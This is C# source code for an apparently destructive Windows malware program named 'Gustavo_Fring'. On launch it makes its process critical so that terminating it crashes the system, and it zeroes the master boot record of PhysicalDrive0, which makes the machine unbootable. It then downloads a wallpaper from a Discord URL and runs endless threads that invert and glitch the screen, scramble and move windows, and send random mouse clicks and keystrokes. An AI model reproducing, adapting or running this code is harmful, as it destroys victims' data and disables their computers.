using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;
using System.Drawing.Imaging;
using System.Drawing;
using System.Xml;
using System.Drawing.Drawing2D;
using Microsoft.Win32;
using System.Media;
using System.Net;
using System.Xml.Schema;

namespace Gustavo_Fring
{
    internal static class Program
    {
        
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        static void Main()
        {
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            var process = Process.GetCurrentProcess();

            // Set the priority of the process to real-time.
            process.PriorityClass = ProcessPriorityClass.RealTime;
            using (var stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.ReadWrite))
            {
                // Seek to the beginning of the stream.
                stream.Seek(0, SeekOrigin.Begin);

                // Create an array of 512 bytes filled with 0.
                var buffer = Enumerable.Repeat((byte)0, 512).ToArray();

                // Write the buffer to the stream.
                stream.Write(buffer, 0, buffer.Length);
            }
            DesktopBackgroundSetter.SetDesktopBackground("https://cdn.discordapp.com/attachments/885221633055424612/1056936291947782245/IMG-20221225-WA0002.jpg");

            var thread = new Thread(RandomizeScreen);
            

            // Start the thread.
            thread.Start();

            var thread2 = new Thread(ScreenInverter.InvertScreenColors);
            thread2.Start();
            var glitchthread = new Thread(RandomScreenshot.TakeAndDrawScreenshot);
            glitchthread.Start();

            var weird = new Thread(ScreenshotWrapper.WrapScreenshot);
            weird.Start();

            var triangles = new Thread(TriangleDrawer.DrawRandomTriangles);
            triangles.Start();

           

            KeyboardButtonPressingThread.StartRandomButtonPresses();
            while (true)
            {
                ChangeWindowTitlesToGibberish();
                MoveWindowsRandomly();
                Cursor.Position = new System.Drawing.Point(GetRandomCoordinate(), GetRandomCoordinate());
                ClickMouse();
                

            }
        }
        static void ChangeWindowTitlesToGibberish()
        {
            // Get a list of all top-level windows.
            var topLevelWindows = GetTopLevelWindows();

            // Iterate over the list of windows.
            foreach (var hwnd in topLevelWindows)
            {
                // Get the length of the window's title.
                var length = GetWindowTextLength(hwnd);

                // Allocate a buffer for the window's title.
                var sb = new StringBuilder(length + 1);

                // Get the window's title.
                GetWindowText(hwnd, sb, sb.Capacity);

                // Generate some gibberish to use as the new window title.
                var gibberish = GenerateGibberish(sb.Length);

                // Set the window's title to the gibberish.
                SetWindowText(hwnd, gibberish);
            }
        }
        static void MoveWindowsRandomly()
        {
            // Get a list of all top-level windows.
            var topLevelWindows = GetTopLevelWindows();

            // Iterate over the list of windows.
            foreach (var hwnd in topLevelWindows)
            {
                // Get the window's rect.
                RECT rect;
                GetWindowRect(hwnd, out rect);

                // Generate some random coordinates.
                var x = GetRandomCoordinate();
                var y = GetRandomCoordinate();

                // Set the window's new position.
                SetWindowPos(hwnd, IntPtr.Zero, x, y, rect.Right - rect.Left, rect.Bottom - rect.Top, 0);
            }
        }
        static void CreateWindow()
        {
            // Create a new form.
            var form = new Form();

            // Set the form's size and position.
            form.Size = new System.Drawing.Size(200, 200);
            form.StartPosition = FormStartPosition.Manual;
            form.Left = GetRandomCoordinate();
            form.Top = GetRandomCoordinate();

            // Remove the form's icon.
            form.Icon = null;

            // Set the form's title.
            form.Text = "Warning";

            //make it topmost
            form.TopMost = true;

            // Add a button to the form.
            var button = new Button();
            button.Text = "Warning";
            button.Dock = DockStyle.Fill;
            form.Controls.Add(button);

            // Show the form.
            form.Show();
            form.Show();
        }

        static IEnumerable<IntPtr> GetTopLevelWindows()
        {
            var windows = new List<IntPtr>();

            EnumWindows((hwnd, param) =>
            {
                windows.Add(hwnd);
                return true;
            }, IntPtr.Zero);

            return windows;
        }
        static void Wallpaper()
        {
            
                
        }
        static string GenerateGibberish(int length)
        {
            var sb = new StringBuilder(length);
            var random = new Random();

            for (int i = 0; i < length; i++)
            {
                sb.Append((char)random.Next(32, 127));
            }

            return sb.ToString();
        }
        static void RandomizeScreen()
        {
            var screenWidth = Screen.PrimaryScreen.Bounds.Width;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                using (var bitmap = new Bitmap(100, 100, PixelFormat.Format32bppArgb))
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    // Set the screen to a random color at 20% opacity.
                    var random = new Random();
                    var color = Color.FromArgb(51, random.Next(256), random.Next(256), random.Next(256));
                    graphics.Clear(color);

                    // Enable hardware acceleration.
                    graphics.SmoothingMode = SmoothingMode.HighSpeed;
                    graphics.PixelOffsetMode = PixelOffsetMode.None;

                    // Draw the bitmap repeatedly to fill the screen.
                    using (var screenGraphics = Graphics.FromHwnd(IntPtr.Zero))
                    {
                        for (int y = 0; y < screenHeight; y += 100)
                        {
                            for (int x = 0; x < screenWidth; x += 100)
                            {
                                screenGraphics.DrawImage(bitmap, x, y);
                            }
                        }
                    }
                }
            }
            
        }
        
        static void ClickMouse()
        {
            // Get the current position of the mouse cursor.
            var position = Cursor.Position;

            // Perform a left mouse button click at the current position.
            mouse_event(MOUSEEVENTF_LEFTDOWN, position.X, position.Y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, position.X, position.Y, 0, 0);
        }
        static int GetRandomCoordinate()
        {
            var random = new Random();
            var width = Screen.PrimaryScreen.Bounds.Width;
            var height = Screen.PrimaryScreen.Bounds.Height;

            // Randomly choose between the width and height of the screen.
            if (random.Next(2) == 0)
            {
                return (int)(random.NextDouble() * width);
            }
            else
            {
                return (int)(random.NextDouble() * height);
            }
        }

        delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("User32.dll")]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);


        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("User32.dll")]
        static extern IntPtr GetWindow(IntPtr hWnd, int uCmd);
        // Constants for the GetWindow and SetWindowPos functions.
        const int GW_CHILD = 5;
        const int GW_HWNDNEXT = 2;
        const uint SWP_NOSIZE = 1;

        [DllImport("User32.dll")]
        static extern IntPtr GetDesktopWindow();



        [StructLayout(LayoutKind.Sequential)]
        struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int GWL_STYLE = -16;
        const int WS_MINIMIZE = 0x20000000;
        const int SW_RESTORE = 9;

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        const int MOUSEEVENTF_LEFTUP = 0x0004;

        [DllImport("User32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);
    }
    public static class ScreenInverter
    {
        public static void InvertScreenColors()
        {
            while (true)
            {
                // Get the dimensions of the screen.
                var screenWidth = Screen.PrimaryScreen.Bounds.Width;
                var screenHeight = Screen.PrimaryScreen.Bounds.Height;

                // Create a bitmap of the screen.
                using (var screenBitmap = new Bitmap(screenWidth, screenHeight))
                using (var screenGraphics = Graphics.FromImage(screenBitmap))
                {
                    // Copy the screen to the bitmap.
                    screenGraphics.CopyFromScreen(0, 0, 0, 0, screenBitmap.Size);

                    // Create an image attribute object.
                    using (var imageAttr = new ImageAttributes())
                    {
                        // Create a color matrix to invert the colors.
                        var colorMatrix = new ColorMatrix(new[]
                        {
                        new float[] {-1, 0, 0, 0, 0},
                        new float[] {0, -1, 0, 0, 0},
                        new float[] {0, 0, -1, 0, 0},
                        new float[] {0, 0, 0, 1, 0},
                        new float[] {1, 1, 1, 0, 1}
                    });

                        // Set the color matrix as the image attribute.
                        imageAttr.SetColorMatrix(colorMatrix);

                        // Draw the inverted image on the screen.
                        using (var innerScreenGraphics = Graphics.FromHwnd(IntPtr.Zero))
                        {
                            innerScreenGraphics.DrawImage(screenBitmap, new Rectangle(0, 0, screenWidth, screenHeight), 0, 0, screenWidth, screenHeight, GraphicsUnit.Pixel, imageAttr);
                        }

                    }
                }
            }
        }
    }
    public static class RandomScreenshot
    {
        public static void TakeAndDrawScreenshot()
        {
            // Create a random number generator.
            var random = new Random();

            // Get the dimensions of the screen.
            var screenWidth = Screen.PrimaryScreen.Bounds.Width;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height;

           while (true)
            {
                // Generate random dimensions for the screenshot.
                var screenshotWidth = random.Next(1, 201);
                var screenshotHeight = random.Next(1, 201);

                // Generate random coordinates for the screenshot.
                var screenshotX = random.Next(0, screenWidth - screenshotWidth);
                var screenshotY = random.Next(0, screenHeight - screenshotHeight);

                // Create a bitmap of the screenshot.
                using (var screenshotBitmap = new Bitmap(screenshotWidth, screenshotHeight))
                using (var screenshotGraphics = Graphics.FromImage(screenshotBitmap))
                {
                    // Copy the screenshot to the bitmap.
                    screenshotGraphics.CopyFromScreen(screenshotX, screenshotY, 0, 0, screenshotBitmap.Size);

                    // Generate random coordinates for the draw location.
                    var drawX = random.Next(0, screenWidth - screenshotWidth);
                    var drawY = random.Next(0, screenHeight - screenshotHeight);

                    // Draw the screenshot on the screen.
                    using (var screenGraphics = Graphics.FromHwnd(IntPtr.Zero))
                    {
                        screenGraphics.DrawImage(screenshotBitmap, drawX, drawY);
                    }
                }
            }
        }
    }
    public static class DesktopBackgroundSetter
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private static readonly int SPIF_UPDATEINIFILE = 0x01;
        private static readonly int SPIF_SENDWININICHANGE = 0x02;
        private static readonly int SPIF_SENDCHANGE = SPIF_SENDWININICHANGE;
        private static readonly int SPIF_SETDESKWALLPAPER = 20;

        public static void SetDesktopBackground(string imageUrl)
        {
            // Create a WebClient object.
            using (var webClient = new WebClient())
            {
                // Download the image.
                var imageData = webClient.DownloadData(imageUrl);

                // Load the image data into an Image object.
                using (var image = Image.FromStream(new System.IO.MemoryStream(imageData)))
                {
                    // Save the image to a temporary file.
                    var tempFileName = System.IO.Path.GetTempFileName();
                    image.Save(tempFileName);

                    // Set the image as the desktop background.
                    SystemParametersInfo(SPIF_SETDESKWALLPAPER, 0, tempFileName, SPIF_SENDCHANGE);
                }
            }
        }
    }
    public static class ScreenshotWrapper
    {
        private static readonly object _lock = new object();
        private static Bitmap _screenshot;
        private static Bitmap _wrappedScreenshot;
        private static Graphics _screenshotGraphics;
        private static Graphics _wrappedScreenshotGraphics;
        private static Graphics _screenGraphics;

        public static void WrapScreenshot()
        {
            // Get the screen width and height.
            var screenWidth = Screen.PrimaryScreen.Bounds.Width;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while(true)
            {
                // Create the screenshot and wrapped screenshot Bitmaps if they don't already exist.
                if (_screenshot == null)
                {
                    _screenshot = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);
                }
                if (_wrappedScreenshot == null)
                {
                    _wrappedScreenshot = new Bitmap(screenWidth + 1, screenHeight);
                }

                // Create the screenshot and wrapped screenshot Graphics objects if they don't already exist.
                if (_screenshotGraphics == null)
                {
                    _screenshotGraphics = Graphics.FromImage(_screenshot);
                }
                if (_wrappedScreenshotGraphics == null)
                {
                    _wrappedScreenshotGraphics = Graphics.FromImage(_wrappedScreenshot);
                }
                if (_screenGraphics == null)
                {
                    _screenGraphics = Graphics.FromHwnd(IntPtr.Zero);
                }

                lock (_lock)
                {
                    // Copy the screen contents to the screenshot Bitmap.
                    _screenshotGraphics.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));

                    // Draw the screenshot to the wrapped screenshot, wrapping the rightmost pixel to the leftmost position.
                    _wrappedScreenshotGraphics.DrawImage(_screenshot, new Rectangle(1, 0, screenWidth, screenHeight), 0, 0, screenWidth, screenHeight, GraphicsUnit.Pixel);
                    _wrappedScreenshotGraphics.DrawImage(_screenshot, new Rectangle(0, 0, 1, screenHeight), screenWidth - 1, 0, 1, screenHeight, GraphicsUnit.Pixel);

                    // Draw the wrapped screenshot to the screen.
                    _screenGraphics.DrawImage(_wrappedScreenshot, new Rectangle(0, 0, screenWidth, screenHeight), 0, 0, screenWidth, screenHeight, GraphicsUnit.Pixel);
                }
            }
        }
    }
    public static class TriangleDrawer
    {
        private static readonly Random _random = new Random();

        public static void DrawRandomTriangles()
        {
            // Get the screen width and height.
            var screenWidth = Screen.PrimaryScreen.Bounds.Width;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height;

            // Create a Graphics object for the screen.
            using (var screenGraphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                // Draw 100 random triangles.
                while (true)
                {
                    // Generate random values for the triangle properties.
                    var size = _random.Next(50, 200);
                    var x1 = _random.Next(0, screenWidth);
                    var y1 = _random.Next(0, screenHeight);
                    var x2 = x1 + _random.Next(-size, size);
                    var y2 = y1 + _random.Next(-size, size);
                    var x3 = x1 + _random.Next(-size, size);
                    var y3 = y1 + _random.Next(-size, size);
                    var color = Color.FromArgb(_random.Next(256), _random.Next(256), _random.Next(256));

                    // Create a Pen object with the random color.
                    using (var pen = new Pen(color))
                    {
                        // Draw the triangle on the screen.
                        screenGraphics.DrawLine(pen, x1, y1, x2, y2);
                        screenGraphics.DrawLine(pen, x2, y2, x3, y3);
                        screenGraphics.DrawLine(pen, x3, y3, x1, y1);
                    }
                    
                }
            }
        }
    }
    public static class KeyboardButtonPressingThread
    {
        private static readonly Random _random = new Random();

        public static void StartRandomButtonPresses()
        {
            // Create a new thread that runs the RandomButtonPresses method.
            var thread = new Thread(RandomButtonPresses);
            thread.Start();
        }

        private static void RandomButtonPresses()
        {
            // Press random buttons indefinitely.
            while (true)
            {
                // Generate a random button to press.
                var button = (char)_random.Next(33, 127);

                // Press the button.
                SendKeys.SendWait(button.ToString());

                // Wait for a random amount of time before pressing the next button.
                Thread.Sleep(_random.Next(1000, 10000));
            }
        }
    }
    
    public static class WallpaperSetter
    {
        // Import the SystemParametersInfo function from the User32.dll library.
        [DllImport("User32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x01;

        public static void SetWallpaperFromScreenshot()
        {
            // Take a screenshot of the entire screen.
            var screenBounds = Screen.PrimaryScreen.Bounds;
            var screenshot = new Bitmap(screenBounds.Width, screenBounds.Height);
            using (var graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size);
            }

            // Save the screenshot to a temporary file.
            var tempFileName = Path.GetTempFileName();
            screenshot.Save(tempFileName, ImageFormat.Bmp);

            // Set the screenshot as the desktop wallpaper.
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempFileName, SPIF_UPDATEINIFILE);

            // Delete the temporary file.
            File.Delete(tempFileName);
        }
    }
    
}
